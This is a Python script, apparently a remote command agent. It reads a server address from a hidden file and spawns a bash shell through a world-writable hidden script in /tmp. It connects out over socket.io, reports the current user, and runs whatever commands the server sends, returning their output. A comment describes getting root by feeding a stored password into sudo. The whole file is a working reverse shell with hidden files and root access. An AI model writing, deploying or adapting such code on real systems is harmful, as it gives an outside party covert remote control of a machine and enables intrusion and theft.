from copyreg import constructor
from logging import warning
from socket import socket
from time import sleep
import socketio
import os

fg_colors = {
    "black" : 30,
    "red" : 31,
    "green" : 32,
    "yellow" : 33,
    "blue" : 34,
    "magenta" : 35,
    "cyan" : 36,
    "light_grey" : 37,
    "grey" : 90,
    "light_red" : 91,
    "light_green" : 92,
    "light_yellow" : 93,
    "light_blue" : 94,
    "light_magenta" : 95,
    "light_cyan" : 96,
    "white" : 97
}

bg_colors = {}

for key in fg_colors:
    bg_colors[key] = fg_colors[key] + 10

bold = {
    "normal" : 0,
    "bold" : 1,
    "faint" : 2,
    "italic" : 3,
    "underlined" : 4
}

class logService():
    def __init__(self):
        self.warning_bg = bg_colors["light_yellow"]
        self.warning_fg = fg_colors["light_yellow"]
        self.warning_bold = bold["normal"]
        self.success_bg = bg_colors["light_green"]
        self.success_fg = fg_colors["light_green"]
        self.success_bold = bold["bold"]
        self.info_bg = bg_colors["light_blue"]
        self.info_fg = fg_colors["light_blue"]
        self.info_bold = bold["normal"]
        self.error_bg = bg_colors["light_red"]
        self.error_fg = fg_colors["light_red"]
        self.error_bold = bold["bold"]

        self.reset_color = fg_colors["white"]

    def reset_colors(self):
        print(f'\033[{str(self.reset_color)}m', end = '')

    def warning(self, text):
        print(f'\033[{str(self.warning_bold)};{str(self.warning_fg)}m[WARNING] :', text)
        self.reset_colors()
    
    def success(self, text):
        print(f'\033[{str(self.success_bold)};{str(self.success_fg)}m[SUCCESS] :', text)
        self.reset_colors()

    def info(self, text):
        print(f'\033[{str(self.info_bold)};{str(self.info_fg)}m[INFO] :', text)
        self.reset_colors()
    
    def error(self, text):
        print(f'\033[{str(self.error_bold)};{str(self.error_fg)}m[ERROR] :', text)
        self.reset_colors()

log_service = logService()

SERVER_URL=open("/usr/local/src/.serverurl.exwrap", "r").read()

# Setting up client web socket connection

sio = socketio.Client()

## Cleaning output file of child process

os.system("echo '' > /tmp/.output")

## Create shell instance on fork

import pty
import signal

var, pid, fd = None, None, None

def createForkShell():
    global pid, fd
    pid, fd = pty.fork()

    if (pid == 0):
        os.system("touch /tmp/.patate.sh && chmod 777 /tmp/.patate.sh")
        buffer = open("/tmp/.patate.sh", "w")
        # Redirect output in /tmp/output.
        buffer.write("#!/bin/bash\n/bin/bash &> /tmp/.output")
        buffer.close()
        pty.spawn("/tmp/.patate.sh")

createForkShell()

var = None

def sHaND(yes, oui):
    global var
    var = "ok"

signal.signal(signal.SIGALRM, sHaND)

my_pid = os.getpid()

# prefix to use a command as a root user echo $(< /tmp/.server.exwrap_info.txt ) | sudo -kS -p '' 

def sendCommandToFork(entry):
    global var, pid, fd
    
    log_service.info("Starting command in process : " + (str(pid)))
    
    if (entry.replace("\n", "") == "stop"):
        os.system("kill -TERM " + str(pid))
        var = "ok"
        createForkShell()
        log_service.success("Successfully killed process : " + str(pid))
        return "stop"
    
    size = os.stat("/tmp/.output").st_size
    os.system("echo '' > /tmp/.output")

    os.write(fd, bytes(entry + "; echo ''; kill -ALRM " + str(my_pid) + "\n", encoding="utf-8"))
    # Wait for end signal
    while (var == None): continue
    log_service.success("Command Executed Successfully")
    var = None
    buffer = open("/tmp/.output", "r", encoding="utf-8", errors="ignore")
    buffer.seek(size)
    output = buffer.read().replace("\0", "")
    buffer.close()
    log_service.info("Command output [" + output[:50] + "...]")
    return output

## Services

def executeCommand(command):
    log_service.info("Command received : " + command)
    sio.emit("command_output", sendCommandToFork(command))

## Events

@sio.event
def connect():
    sio.emit("name", {"name" : os.popen("whoami").read()})
    log_service.success("Successfully connected to server. Waiting for instructions...")

@sio.event
def connect_error(data):
    log_service.error("Connection failed.")

@sio.event
def message(data):
    #print('I received a message!')
    if (data["type"] == "msg"):
        print(data["msg"])
    elif (data["type"] == "command"):
        executeCommand(data["command"])

@sio.event
def disconnect():
    log_service.error("Server lost. Trying to reconnect...")
    #print("Server isn't running anymore :(")

while (not(sio.connected)):
    try:
        sio.connect(SERVER_URL)
    except:
        log_service.warning("Server : " + SERVER_URL.replace("\n", "") + " can't be reached. Trying to connect...")
        #print("Server not running")
    sleep(3)
